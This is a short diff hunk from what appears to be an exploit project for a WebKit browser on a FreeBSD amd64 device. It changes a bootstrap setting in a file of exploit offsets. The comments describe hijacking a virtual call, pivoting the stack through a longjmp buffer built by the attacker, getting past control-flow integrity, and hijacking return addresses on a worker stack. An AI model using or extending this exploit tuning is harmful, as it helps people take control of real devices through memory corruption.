@@ -92,7 +92,7 @@ const OFFSET_wk_cmp_operands_reversed    = true;
 // virtual dispatch to get `rdi = this`, and pivot with longjmp. main.js runs a
 // non-destructive milestone first to confirm the virtual call and find the
 // trigger op; OFFSET_wk_vtable_trigger is filled in once the device reports it.
-const OFFSET_wk_bootstrap                 = "selfstack";  // CFI-immune: hijack a return address on our own main-thread stack (fakevtable was CFI-dead, worker park has no stable ret slot)
+const OFFSET_wk_bootstrap                 = "";  // JIT-less: JS-frame (LLInt) pivot is not viable; native worker-stack hijack is the JIT-independent path
 // mov rsp, rdi ; ret  -- the pivot for a `rdi = this` virtual call (fallback;
 // longjmp is used as the primary pivot since its jmp_buf is fully attacker-built:
 // +0x00 rip, +0x10 rsp, standard FreeBSD amd64 layout, confirmed in libc 613).
